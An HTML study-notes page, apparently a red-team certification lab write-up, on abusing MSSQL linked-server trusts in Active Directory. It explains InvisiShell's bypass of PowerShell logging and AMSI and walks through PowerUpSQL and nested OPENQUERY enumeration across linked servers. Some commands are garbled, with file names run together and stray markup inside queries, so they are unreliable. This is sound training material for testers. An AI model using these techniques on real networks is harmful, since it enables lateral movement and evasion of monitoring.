@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trust Abuse - MSSQL Servers Database Links | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content { max-width: 100%; margin: 0 auto; padding: 30px; font-size: 20px; }
+    .goad-content h1 { color: var(--white-2); font-size: 36px; margin-bottom: 25px; }
+    .goad-content h2 { color: var(--orange-yellow-crayola); font-size: 30px; margin: 35px 0 20px 0; padding-bottom: 10px; border-bottom: 1px solid var(--jet); }
+    .goad-content h3 { color: var(--white-1); font-size: 26px; margin: 30px 0 15px 0; }
+    .goad-content h4 { color: var(--white-2); font-size: 24px; margin: 25px 0 15px 0; }
+    .goad-content p { color: var(--light-gray); margin-bottom: 18px; line-height: 1.8; font-size: 20px; word-wrap: break-word; overflow-wrap: break-word; }
+    .goad-content code { background: var(--onyx); color: var(--orange-yellow-crayola); padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 18px; }
+    .goad-content pre { background: var(--eerie-black-2); border: 1px solid var(--jet); border-radius: 8px; padding: 20px; overflow-x: auto; margin: 20px 0; }
+    .goad-content pre code { background: transparent; color: var(--light-gray); padding: 0; font-size: 18px; }
+    .goad-content ul, .goad-content ol { margin: 20px 0; padding-left: 30px; }
+    .goad-content li { color: var(--light-gray); margin-bottom: 10px; font-size: 20px; line-height: 1.8; }
+    .goad-content img { max-width: 100%; border-radius: 8px; margin: 25px 0; border: 1px solid var(--jet); }
+    .goad-content blockquote { border-left: 4px solid var(--orange-yellow-crayola); padding-left: 20px; margin: 20px 0; color: var(--light-gray-70); }
+    .goad-content hr { border: none; border-top: 1px solid var(--jet); margin: 40px 0; }
+    .goad-content table { width: 100%; border-collapse: collapse; margin: 25px 0; font-size: 18px; }
+    .goad-content th, .goad-content td { border: 1px solid var(--jet); padding: 12px; text-align: left; color: var(--light-gray); }
+    .goad-content th { background: var(--eerie-black-2); color: var(--white-2); font-weight: 500; }
+    .part-navigation { display: flex; justify-content: space-between; margin-top: 50px; padding-top: 30px; border-top: 1px solid var(--jet); }
+    .part-navigation a { color: var(--orange-yellow-crayola); text-decoration: none; font-size: 18px; display: flex; align-items: center; gap: 8px; }
+    .part-navigation a:hover { text-decoration: underline; }
+    .goad-sidebar-list { list-style: none; padding: 0; margin: 0; }
+    .goad-sidebar-list li { margin-bottom: 8px; }
+    .goad-sidebar-list a { color: var(--light-gray); text-decoration: none; font-size: 14px; display: block; padding: 5px 0; transition: color 0.25s ease; }
+    .goad-sidebar-list a:hover { color: var(--orange-yellow-crayola); }
+    .back-link { display: flex; align-items: center; gap: 8px; color: var(--orange-yellow-crayola); text-decoration: none; font-size: 14px; margin-bottom: 15px; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        <div class="separator"></div>
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Jump to Part:</p>
+        <ul class="goad-sidebar-list">
+<li><a href="part-01-introduction.html">Part 1: Part 1</a></li>
+<li><a href="part-02-enumeration.html">Part 2: Part 2</a></li>
+<li><a href="part-03-privilege-escalation.html">Part 3: Part 3</a></li>
+<li><a href="part-04-kerberoasting-attack.html">Part 4: Part 4</a></li>
+<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Part 5</a></li>
+<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html">Part 6: Part 6</a></li>
+<li><a href="part-07-dumping-lsass-credentials.html">Part 7: Part 7</a></li>
+<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Part 8</a></li>
+<li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: Part 9</a></li>
+<li><a href="part-10-pass-the-certificates-attack.html">Part 10: Part 10</a></li>
+<li><a href="part-11-privilege-escalation---unconstraine.html">Part 11: Privilege Escalation - Unconstrained Delegation</a></li>
+<li><a href="part-12-privilege-escalation---constrained-.html">Part 12: Privilege Escalation - Constrained Delegation</a></li>
+<li><a href="part-13-privilege-escalation---rbcd.html">Part 13: Privilege Escalation - RBCD</a></li>
+<li><a href="part-14-domain-persistence---golden-ticket-.html">Part 14: Domain Persistence - Golden Ticket Attack</a></li>
+<li><a href="part-15-domain-persistence---silver-ticket-.html">Part 15: Domain Persistence - Silver Ticket Attack</a></li>
+<li><a href="part-16-domain-persistence---diamond-ticket.html">Part 16: Domain Persistence - Diamond Ticket Attack</a></li>
+<li><a href="part-17-domain-persistence---skeleton-key-a.html">Part 17: Domain Persistence - Skeleton Key Attack</a></li>
+<li><a href="part-18-domain-persistence---sapphire-ticke.html">Part 18: Domain Persistence - Sapphire Ticket Attack</a></li>
+<li><a href="part-19-domain-persistence---adminsdholder-.html">Part 19: Domain Persistence - AdminSDHolder Attack</a></li>
+<li><a href="part-20-cross-domain-attacks---active-direc.html">Part 20: Cross Domain Attacks - Active Directory Certificate</a></li>
+<li><a href="part-21-shadow-credentials---abusing-user-o.html">Part 21: Shadow Credentials - Abusing User Object</a></li>
+<li><a href="part-22-cross-domain-attacks---unconstraine.html">Part 22: Cross Domain Attacks - Unconstrained Delegation</a></li>
+<li><a href="part-23-cross-domain-attacks---attacking-az.html">Part 23: Cross Domain Attacks - Attacking Azure AD Integration</a></li>
+<li><a href="part-24-cross-domain-attacks---child-to-for.html">Part 24: Cross Domain Attacks - Child To Forest Root SID History</a></li>
+<li><a href="part-25-cross-domain-attacks---child-to-for.html">Part 25: Cross Domain Attacks - Child To Forest Root SID History (Part 2)</a></li>
+<li><a href="part-26-cross-forest-attacks---kerberoast-a.html">Part 26: Cross Forest Attacks - Kerberoast Attack</a></li>
+<li><a href="part-27-cross-forest-attacks---constrained-.html">Part 27: Cross Forest Attacks - Constrained Delegation</a></li>
+<li><a href="part-28-cross-forest-attacks---unconstraine.html">Part 28: Cross Forest Attacks - Unconstrained Delegation</a></li>
+<li><a href="part-29-cross-forest-attacks---trust-key-ab.html">Part 29: Cross Forest Attacks - Trust Key Abuse</a></li>
+<li><a href="part-30-cross-forest-attacks---injecting-si.html">Part 30: Cross Forest Attacks - Injecting SID History</a></li>
+<li><a href="part-31-trust-abuse---mssql-servers-databas.html" style="color: var(--orange-yellow-crayola);">Part 31: Trust Abuse - MSSQL Servers Database Links</a></li>
+<li><a href="part-32-cross-forest-attacks---foreign-secu.html">Part 32: Cross Forest Attacks - Foreign Security Principals</a></li>
+<li><a href="part-33-cross-forest-attacks---abusing-pam.html">Part 33: Cross Forest Attacks - Abusing PAM</a></li>
+<li><a href="part-34-cross-forest-attacks---trusting-to-.html">Part 34: Cross Forest Attacks - Trusting to Trusted Trust Key</a></li>
+<li><a href="part-35-cross-forest-attacks---abusing-trus.html">Part 35: Cross Forest Attacks - Abusing Trust Transitivity</a></li>
+        </ul>
+      </div>
+    </aside>
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <div class="goad-content">
+<h1>CRTE - Certified Red Team Expert</h1>
+<h2><strong>Trust Abuse - MSSQL Servers - Database Links</strong></h2>
+<p>Trust Abuse in MSSQL Servers is an advanced attack vector that exploits misconfigurations in authentication, delegation, and linked server trust relationships to escalate privileges and move laterally across an environment. MSSQL is often treated as just a database service, but in Active Directory environments, it can act as a bridge between security boundaries, allowing attackers to exploit its features to compromise entire domains.</p>
+<p>The process starts with an attacker gaining an initial foothold on an MSSQL server. This access can be obtained through weak credentials, SQL injection, or existing domain-level privileges. Once inside, the real power of the attack comes from leveraging <strong>linked servers</strong>, <strong>authentication delegation</strong>, and <strong>execution mechanisms</strong> to pivot further. Linked servers are often used to facilitate legitimate cross-server queries, but when improperly configured, they allow attackers to execute queries on remote databases with inherited privileges. If the linked server is authenticated with a privileged account, an attacker can abuse this trust to execute commands or retrieve sensitive data from another SQL instance. This lateral movement extends beyond just SQL environments if an MSSQL server has the ability to execute system commands, it can provide a direct path to full system compromise.</p>
+<p>A critical aspect of trust abuse comes from <strong>how MSSQL handles authentication and delegation</strong>. SQL servers can authenticate users through Windows Authentication (Kerberos/NTLM) or SQL Authentication (username/password stored in the database). If an SQL service is running under a domain account that is trusted for delegation, attackers can leverage <strong>Kerberos delegation attacks</strong> to escalate privileges. <strong>Unconstrained delegation</strong> allows attackers to extract Kerberos tickets of any user who connects to the SQL server, including domain administrators. <strong>Constrained delegation (S4U2Self/S4U2Proxy)</strong> provides a way for attackers to impersonate users and access specific services, while <strong>Resource-Based Constrained Delegation (RBCD)</strong> allows an attacker to modify delegation permissions to impersonate high-privilege accounts.</p>
+<p>Another overlooked execution method in MSSQL abuse is <strong>SQL Agent Jobs</strong>, which attackers can use for persistent execution. If an attacker gains sysadmin privileges on an MSSQL instance, they can schedule malicious jobs that execute payloads at predefined intervals, ensuring long-term persistence even if the original shell is lost. Because SQL Agent Jobs are a legitimate feature, they are often ignored by security monitoring tools.</p>
+<p>Once attackers gain execution capabilities inside MSSQL, they often escalate privileges to <strong>NT AUTHORITY\SYSTEM</strong>. Many MSSQL servers run under LocalSystem, meaning that executing system commands through SQL procedures results in full control over the host. This allows attackers to dump credentials from LSASS, modify registry keys, create administrator accounts, and move laterally within the environment.</p>
+<p>Even if direct command execution via <code>xp_cmdshell</code> is disabled, attackers can abuse <strong>alternative stored procedures</strong> such as <strong>sp_OACreate (OLE Automation Procedures)</strong>, <strong>CLR Assemblies</strong>, or <strong>xp_dirtree (UNC path exploitation)</strong> to execute arbitrary commands. These methods bypass traditional restrictions and allow an attacker to maintain access in environments where security controls attempt to restrict direct system interaction.</p>
+<p>In multi-forest environments, MSSQL servers can be leveraged for <strong>cross-forest trust abuse</strong>. If a trust exists between two Active Directory forests, attackers can enumerate and exploit linked servers to pivot between environments. <strong>Foreign Security Principals (FSPs) and SIDHistory misconfigurations</strong> can allow accounts in one forest to have hidden privileges in another, providing a stealthy way to escalate privileges across domains. Since these permissions do not always appear in standard privileged user lists, attackers rely on extensive <strong>ACL enumeration</strong> to identify hidden trust relationships.</p>
+<p>If an MSSQL server has a trust relationship with a <strong>domain controller</strong>, it becomes an even more valuable target. Some environments have MSSQL servers running directly on domain controllers, which is a critical security risk. If an attacker compromises an SQL instance on a domain controller, they can access <strong>NTDS.dit</strong>, the Active Directory database, and extract credentials for every domain user. Even if the SQL server is separate, if it has <strong>privileged access to a DC through linked servers</strong>, it can serve as a pivot to execute <strong>DCSync attacks</strong> or dump credentials remotely.</p>
+<p>Trust Abuse in MSSQL is not just about compromising individual database servers, it’s about leveraging <strong>the interconnected nature of these systems</strong> to escalate privileges, evade detection, and persist in an environment. A single compromised SQL server can provide a path to domain-wide compromise if trust relationships, delegation settings, and authentication mechanisms are not properly secured. Before moving to the demonstration, it’s essential to understand these core attack flows, <strong>starting from an initial foothold, abusing linked servers, leveraging authentication delegation, executing system commands, extracting credentials, and escalating privileges across forests and domains</strong>.</p>
+<h1>Enumerating MSSQL in Cross-Forest Trusts</h1>
+<p>Enumerating MSSQL in cross-forest trusts using <strong>PowerUpSQL</strong> is a critical step in understanding how database trust relationships can be abused for lateral movement and privilege escalation.</p>
+<p>When dealing with <strong>MSSQL servers in a cross-forest trust scenario</strong>, the first objective is to identify <strong>accessible SQL instances</strong> and determine their authentication methods. <strong>PowerUpSQL</strong> provides a comprehensive framework for discovering and enumerating SQL servers within an environment. Since <strong>cross-forest trusts</strong> allow authentication from one forest to another, an attacker who has credentials in one domain can attempt to access MSSQL instances in the trusted domain.</p>
+<h2>Invisi-Shell</h2>
+<p><strong>InvisiShell</strong> is a tool designed to bypass security controls in PowerShell, allowing for the stealthy execution of scripts by circumventing enhanced logging mechanisms and detection by security software.</p>
+<p>Here’s a detailed explanation of how InvisiShell works:</p>
+<ul>
+<li><strong>Bypassing PowerShell Security Measures</strong>: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI). </li>
+</ul>
+<p>These are security features that Microsoft implemented to monitor and log PowerShell activity.</p>
+<ul>
+<li><strong>System-wide transcription</strong> logs all PowerShell commands and their output.</li>
+<li><strong>Script block logging</strong> records the content of PowerShell scripts.</li>
+<li><strong>AMSI</strong> scans scripts for malicious content before they are executed.</li>
+<li><strong>Hooking .NET Assemblies</strong>: InvisiShell achieves its bypass by hooking into the .NET assemblies <code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>.</li>
+<li>This is accomplished using a <strong>CLR (Common Language Runtime) profiler API</strong>.</li>
+<li>A <strong>CLR profiler</strong> is a DLL loaded by the CLR at runtime to intercept and modify the behavior of these assemblies via the profiling API.</li>
+<li><strong>Methods of Use</strong>: InvisiShell can be launched in two ways, depending on the user's privileges:</li>
+<li><strong>With administrator privileges</strong>: The <code>RunWithPathAsAdmin.bat</code> script is used.</li>
+<li><strong>Without administrator privileges</strong>: The <code>RunWithRegistryNonAdmin.bat</code> script is used. This method creates a CLR profiler and starts a new PowerShell session with disabled logging.</li>
+<li><strong>Incapacitating Security Features</strong>: By hooking into these .NET assemblies, <strong>InvisiShell disables system-wide transcription, AMSI, and script block logging</strong> for the current PowerShell session.</li>
+<li><strong>Avoiding Detection</strong>: When using InvisiShell, the tool hooks to <code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>, which allows it to avoid system-wide transcription, script block logging, and AMSI.</li>
+<li><strong>Integration with Other Tools</strong>: The sources show that InvisiShell can be used in conjunction with other tools, such as PowerUp, PowerView, the AD module, and other PowerShell scripts.</li>
+<li><strong>Clean-up Process</strong>: To complete the clean-up, users must type <code>exit</code> in the new PowerShell session created by InvisiShell.</li>
+<li><strong>Modified Version</strong>: The class uses a slightly modified version of InvisiShell.</li>
+<li><strong>Location of Tools</strong>: All the tools, including InvisiShell, used in the lab environment are located in the <code>C:\AD</code> directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded.</li>
+<li><strong>InvisiShell and Binaries</strong>: It is noted that binaries like <code>Rubeus.exe</code> may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt.</li>
+<li><strong>Example Usage</strong>: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine.</li>
+</ul>
+</ul>
+<p>In summary, <strong>InvisiShell is essential for maintaining stealth in the lab environment</strong> by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software.</p>
+<p>It’s always good that we do run Invisi-Shell via cmd before we start doing our enumeration and right after script execution, Powershell will be executed. This script should be executed depending on the type of privilege we do have on the machine.</p>
+<p>If we are just a simple low level privileged user, then we should run<em> </em><code>RunWithRegistetyNonAdmin.bat.</code></p>
+<p>If we are a high level privileged user like Administrator for example, then we should run <code>RunWithPathAsAdmin.batRunWithRegistryNonAdmin.bat</code></p>
+<img src="./images/screenshot_402.png" alt="image">
+<p>To verify whether <strong>InvisiShell</strong> has successfully bypassed the intended PowerShell defenses (e.g., logging mechanisms, AMSI, or other detection features), you can perform targeted tests to validate its effectiveness, but we will bypass this for now and go straightforward on MSSQL enumeration.</p>
+<p><strong>Get-SQLInstanceDomain</strong> in PowerUpSQL is useful for discovering MSSQL instances across the domain, including those in a trusted forest if the enumeration is performed with a valid cross-domain account.</p>
+<p><code>Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1Get-SQLInstanceDomain</code></p>
+<img src="./images/screenshot_403.png" alt="image">
+<p>The output above show us one MSSQL instance configured on <code>us.techcorp.local</code> domain, which is our current domain.</p>
+<p>Using the command <code>Get-SQLServerInfo</code>, we  are able to get detailed info about the MSSQL instance we just found.</p>
+<p><code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></p>
+<img src="./images/screenshot_404.png" alt="image">
+<ul>
+<li><strong>ComputerName:</strong> The hostname of the SQL Server machine (<code>us-mssql.us.techcorp.local</code>), which helps identify where the service is running.</li>
+<li><strong>Instance:</strong> The specific SQL Server instance name (<code>US-MSSQL</code>), useful when multiple instances run on the same machine.</li>
+<li><strong>DomainName:</strong> The Active Directory domain to which the SQL Server belongs (<code>US</code>), indicating its authentication scope.</li>
+<li><strong>ServiceProcessID:</strong> The process ID (<code>1552</code>) assigned to the SQL Server process, useful for identifying it in system monitoring tools.</li>
+<li><strong>ServiceName:</strong> The Windows service running SQL Server (<code>MSSQLSERVER</code>), which can be targeted for privilege escalation or persistence.</li>
+<li><strong>ServiceAccount:</strong> The account under which the SQL Server service is running (<code>US\dbservice</code>), critical for understanding its privileges and potential delegation abuses.</li>
+<li><strong>AuthenticationMode:</strong> Indicates whether the server supports Windows and/or SQL authentication (<code>Windows and SQL Server Authentication</code>), which determines attack surfaces for credential-based access.</li>
+<li><strong>ForcedEncryption:</strong> Whether SQL Server forces encrypted connections (<code>0</code> means disabled), which affects how traffic can be intercepted.</li>
+<li><strong>Clustered:</strong> Specifies if the SQL Server is part of a failover cluster (<code>No</code> means it's a standalone instance).</li>
+<li><strong>SQLServerVersionNumber:</strong> The full version number of SQL Server (<code>14.0.1000.169</code>), useful for identifying vulnerabilities.</li>
+<li><strong>SQLServerMajorVersion:</strong> The major version of SQL Server (<code>2017</code>), relevant for knowing available features and exploits.</li>
+<li><strong>SQLServerEdition:</strong> The edition type (<code>Developer Edition (64-bit)</code>), which impacts licensing and certain security features.</li>
+<li><strong>SQLServerServicePack:</strong> The service pack level (<code>RTM</code> means it’s the initial release without updates), indicating if it may lack security patches.</li>
+<li><strong>OSArchitecture:</strong> The architecture of the SQL Server machine (<code>X64</code> means 64-bit).</li>
+<li><strong>OsVersionNumber:</strong> The OS version running SQL Server (<code>SQL</code>), indicating the underlying operating system.</li>
+<li><strong>CurrentLogin:</strong> The SQL login currently in use (<code>US\studentuser163</code>), which helps determine privileges and access scope.</li>
+<li><strong>IsSysadmin:</strong> Whether the current login has sysadmin privileges (<code>No</code> means limited access).</li>
+<li><strong>ActiveSessions:</strong> The number of active SQL sessions (<code>1</code>), useful for monitoring user activity.</li>
+</ul>
+<h1>Database Trust Links Enumeration</h1>
+<p>From the enumeration, we can see that our current use (<code>studentuser163</code>) has a Non-Admin access to MSSQL instance <code>US-MSSQL</code> in our domain <code>us.techcorp.local</code>.</p>
+<p>Once MSSQL servers are identified, the next step is to check for <strong>misconfigured linked servers</strong>, as these provide an <strong>entry point to execute queries and commands across multiple database servers</strong>.</p>
+<p><strong>Get-SQLServerLink</strong> is specifically designed to enumerate linked servers within an MSSQL environment. It retrieves <strong>database trust links</strong>, showing which servers are linked and what authentication is used between them. This is crucial because <strong>linked servers often retain inherited privileges</strong>, meaning that compromising a single SQL instance could provide access to a different, more privileged database in another domain. If the linked server uses Windows Authentication and the current SQL session is running under a high-privileged service account, it could be possible to pivot and execute commands on remote databases across the trust boundary. Let’s now focus on <code>US-MSSQL</code> Database Trust Link enumeration.</p>
+<p><code>Get-SQLServerLink -Instance 'US-MSSQL.us.techcorp.local' -Verbose</code></p>
+<img src="./images/screenshot_405.png" alt="image">
+<ul>
+<li><strong>ComputerName:</strong> The hostname of the SQL Server where the enumeration is being performed (<code>US-MSSQL.us.techcorp.local</code>).</li>
+<li><strong>Instance:</strong> The SQL Server instance name (<code>US-MSSQL</code>).</li>
+<li><strong>DatabaseLinkId:</strong> A numerical identifier for each linked server entry (<code>0</code> for local, <code>1</code> for remote).</li>
+<li><strong>DatabaseLinkName:</strong> The name or IP address of the linked SQL server. The first entry is local (<code>US-MSSQL</code>), while the second points to a remote server (<code>192.168.23.25</code>).</li>
+<li><strong>DatabaseLinkLocation:</strong> Indicates whether the link is local (self-referencing) or remote (connecting to another SQL server).</li>
+<li><strong>Product:</strong> Specifies the database type (SQL Server).</li>
+<li><strong>Provider:</strong> The provider used to communicate with the linked server (<code>SQLNCLI</code>, SQL Native Client).</li>
+<li><strong>Catalog:</strong> This field would contain the default database catalog used for the linked connection but is empty here.</li>
+<li><strong>LocalLogin:</strong> The local SQL user account mapped to this linked server, but it’s not explicitly set in this case.</li>
+<li><strong>RemoteLoginName:</strong> If the linked server uses a remote login for authentication, it would appear here, but it’s empty.</li>
+<li><strong>is_rpc_out_enabled:</strong> Determines whether the <strong>linked server allows executing remote stored procedures</strong> (<code>True</code> for local, <code>False</code> for remote). If enabled, it could allow command execution across linked servers.</li>
+<li><strong>is_data_access_enabled:</strong> Defines whether the <strong>linked server allows querying remote databases</strong> (<code>False</code> for local, <code>True</code> for remote), which means data retrieval from <code>192.168.23.25</code> is possible.</li>
+<li><strong>modify_date:</strong> The last time the linked server configuration was modified.</li>
+</ul>
+<h3><strong>Key Information to Pay Attention To</strong></h3>
+<ol>
+<li><strong>Identifying Remote Database Links:</strong> The presence of a remote linked server (<code>192.168.23.25</code>) indicates a <strong>trust relationship</strong> that could be abused for lateral movement.</li>
+<li><strong>RPC Out Execution (</strong><code>is_rpc_out_enabled</code><strong>):</strong> If <code>True</code>, the linked server may allow executing remote stored procedures, which can be exploited for remote command execution.</li>
+<li><strong>Data Access (</strong><code>is_data_access_enabled</code><strong>):</strong> If enabled, attackers can directly query remote databases, extracting sensitive information.</li>
+<li><strong>Authentication & Privileges:</strong> The absence of explicit <code>LocalLogin</code> or <code>RemoteLoginName</code> could indicate that the linked server <strong>inherits the privileges of the current SQL session</strong>, meaning an attacker with high privileges on <code>US-MSSQL</code> might automatically get equivalent rights on <code>192.168.23.25</code>.</li>
+<li><strong>Timestamps (</strong><code>modify_date</code><strong>):</strong> Reviewing modification dates helps determine if <strong>trust relationships were recently changed</strong>, which could indicate newly added attack surfaces.</li>
+</ol>
+<p>If the linked server is misconfigured and allows <strong>query execution or RPC calls</strong>, it can be <strong>leveraged to move laterally</strong> and potentially escalate privileges by pivoting through the MSSQL environment.</p>
+<p>This enumeration phase is essential in understanding the <strong>scope of trust relationships</strong> between SQL servers and how they can be leveraged in a broader attack chain. By focusing on <strong>PowerUpSQL’s discovery capabilities</strong> and <strong>Get-SQLServerLink’s enumeration of database trust links</strong>, attackers can map out <strong>potential pivot points, privilege escalation opportunities, and cross-forest attack paths</strong>.</p>
+<h1>MSSQL Remote Access (HeidiSQL)</h1>
+<p>Remotely accessing the MSSQL server <strong>US-MSSQL</strong> in <strong>us.techcorp.local</strong> using <strong>HeidiSQL</strong> requires a straightforward approach. HeidiSQL is a lightweight GUI that supports SQL Server connections and can be used to interact with the target database once valid credentials are available.</p>
+<p>To connect, the <strong>server’s hostname or IP address</strong> is needed along with <strong>a valid authentication method</strong>. If <strong>SQL Authentication</strong> is enabled, a <strong>username and password</strong> must be used. If <strong>Windows Authentication</strong> is required, a valid domain user account is necessary, and HeidiSQL must be run with those credentials. The <strong>default MSSQL port is 1433</strong>, but if a different port is used, it must be specified.</p>
+<p>Once connected, HeidiSQL provides an interactive way to enumerate <strong>databases, tables, stored procedures, and linked servers</strong> without needing to use a command-line SQL shell. This allows for easier navigation of the database structure and helps in identifying <strong>privileged accounts, misconfigurations, and potential exploitation points</strong>.</p>
+<p>If the target SQL server is behind a firewall or restricted to internal access, tunneling may be required. This can be done through <strong>SSH tunnels, VPN access, or SOCKS proxies</strong> to route HeidiSQL traffic through an accessible machine in the internal network. If <strong>MSSQL authentication trusts linked servers</strong>, credentials obtained from another SQL server may work to authenticate directly to <strong>US-MSSQL</strong> without needing separate login credentials.</p>
+<p>With remote access established, the next phase involves exploring <strong>privileges, database contents, linked servers, and execution capabilities</strong> to determine the best path for lateral movement or privilege escalation.</p>
+<p>We already know that our current user studentuser163 has access to <code>US-MSSQL</code>, so let’s configure HeidiSQL to access it. Make sure that we are using the following configurations on the screenshot.</p>
+<p>Windows Authentication is needed for this access on <code>US-MSSQL</code> because <code>studentuser163</code> is valid domain user.</p>
+<img src="./images/screenshot_406.png" alt="image">
+<img src="./images/screenshot_407.png" alt="image">
+<p>Once we are logged in, let’s sue <code>openquery</code> to make the queries we want to the database s it’s possible to see above.</p>
+<p><code>Select * from master..sysservers</code></p>
+<img src="./images/screenshot_408.png" alt="image">
+<p>The screenshot from <strong>HeidiSQL</strong> shows the results of querying <code>master..sysservers</code>, which lists configured <strong>linked servers</strong> on the MSSQL instance <strong>US-MSSQL</strong> in <strong>us.techcorp.local</strong>.</p>
+<p>The table confirms two SQL servers:</p>
+<ol>
+<li><strong>US-MSSQL</strong> (local server)</li>
+<li><strong>192.168.23.25</strong> (remote linked server)</li>
+</ol>
+<p>Key findings for the <strong>remote linked server (192.168.23.25).</strong></p>
+<ul>
+<li><strong>The server is linked but marked as "not remote" (</strong><code>isremote=False</code><strong>)</strong>, meaning it might be treated as a local resource when executing queries, potentially allowing privilege escalation if misconfigured.</li>
+<li><strong>RPC is disabled (</strong><code>rpcout=False</code><strong>)</strong>, which means executing stored procedures remotely may not be possible unless reconfigured or bypassed through other methods.</li>
+<li><strong>Data access is enabled (</strong><code>dataaccess=True</code><strong>)</strong>, confirming that the linked server allows querying databases on <code>192.168.23.25</code>, meaning an attacker can extract data from it.</li>
+<li><strong>User remote connection is enabled (</strong><code>useremoteconn=True</code><strong>)</strong>, allowing remote queries, reinforcing that cross-server interactions are possible.</li>
+<li><strong>The linked server is identified as a SQL Server (</strong><code>srvproduct=SQL Server</code><strong>)</strong>, confirming it runs a standard MSSQL service.</li>
+<li><strong>No specific remote login credentials are shown</strong>, meaning it could be inheriting the authentication context of the current SQL session, potentially allowing higher privileges if the session is running under a privileged account.</li>
+</ul>
+<p>This enumeration confirms that <strong>192.168.23.25</strong> can be accessed via linked queries, and with <strong>data access enabled</strong>, it might be possible to extract information or pivot further into the environment.</p>
+<p>The lack of RPC (<code>rpcout=False</code>) could limit some attack vectors, but <strong>if the current session has high privileges, this server could still be exploited for data exfiltration or lateral movement</strong>.</p>
+<p>Using <strong>nested </strong><code>OPENQUERY</code><strong> within another </strong><code>OPENQUERY</code> is a technique that allows executing <strong>queries across multiple linked servers</strong> by layering one <code>OPENQUERY</code> inside another. This is useful when a linked server (<strong>192.168.23.25</strong>) has <strong>a further linked server connection</strong>, enabling indirect query execution beyond the immediate SQL instance.</p>
+<p>In the context of <strong>192.168.23.25</strong>, if it is linked to another SQL server, an attacker can <strong>chain linked queries</strong> by embedding an <code>OPENQUERY</code> inside another <code>OPENQUERY</code>. This technique allows executing SQL commands on a <strong>third server that is only accessible from 192.168.23.25</strong>, effectively bypassing direct access restrictions.</p>
+<p>This approach is valuable when <strong>direct access to a deeper SQL server is blocked</strong>, but it can be reached through <strong>an intermediary linked server</strong>. By nesting queries, an attacker can pivot further within the SQL infrastructure, moving laterally across <strong>multiple trust relationships</strong> without needing explicit access to all servers in the chain.</p>
+<p><code>Select <em> FROM openquery("192.168.23.25",'Select </em> FROM master..sysservers')</code></p>
+<img src="./images/screenshot_409.png" alt="image">
+<p>Paying attention on numerical identifier for each linked server entry (<code>0</code> for local, <code>1</code> for remote), <code>DB-SQLPROD</code> is the local (192.168.23.25) and <code>DB-SQLSRV</code> is our another remote database trust link.</p>
+<p>So let’s make another <code>OpenQuery</code> from <code>US-MSSQL</code> → <code>DB-SQLPROD</code> (192.168.23.25) → <code>DB-SQLSRV</code>.</p>
+<p>When nesting <code>OPENQUERY</code><strong> within another </strong><code>OPENQUERY</code>, special attention must be given to the <strong>handling of single quotes (</strong><code>'</code><strong>)</strong>, as SQL Server requires escaping them properly.</p>
+<p>The inner <code>OPENQUERY</code> (targeting <code>"DB-SQLSRV"</code>) contains its own SQL statement, which is wrapped in <strong>single quotes (</strong><code>'</code><strong>)</strong>. However, since this query itself is inside another <code>OPENQUERY</code> (targeting <code>"192.168.23.25"</code>), the single quotes inside the inner query need to be <strong>escaped by doubling them (</strong><code>''</code><strong>)</strong> to ensure they are correctly parsed.</p>
+<p>Failure to escape these properly will result in syntax errors, causing the query to fail. When <strong>nesting </strong><code>OPENQUERY</code><strong> statements</strong>, always verify that <strong>each layer of the query correctly escapes its inner single quotes</strong>, otherwise the execution will break due to misinterpreted SQL syntax.</p>
+<p><code>SELECT <em> FROM OPENQUERY ("192.168.23.25",'Select </em> From openquery ("DB-SQLSRV", ''SELECT * FROM master..sysservers'')')</code></p>
+<img src="./images/screenshot_410.png" alt="image">
+<p>As we can see above, this time, when making the database trust links enumeration using <code>DB-SQLSRV</code> we can see that output now is <code>0</code>, so that one does not have database trusted links with another database. This way we can move on enumerating <code>DB-SQLSRV</code> itself.</p>
+<p>We can use <code>@@version</code> command to enumerate <code>DB-SQLSRV</code> version.</p>
+<p><code>SELECT <em> FROM OPENQUERY ("192.168.23.25",'Select </em> From openquery ("DB-SQLSRV", ''SELECT @@version'')')</code></p>
+<img src="./images/screenshot_411.png" alt="image">
+<p>We could carry on here manually as I just demonstrated using <strong>HeidiSQL.</strong></p>
+<h1>MSSQL Remote Access (PowerUpSQL)</h1>
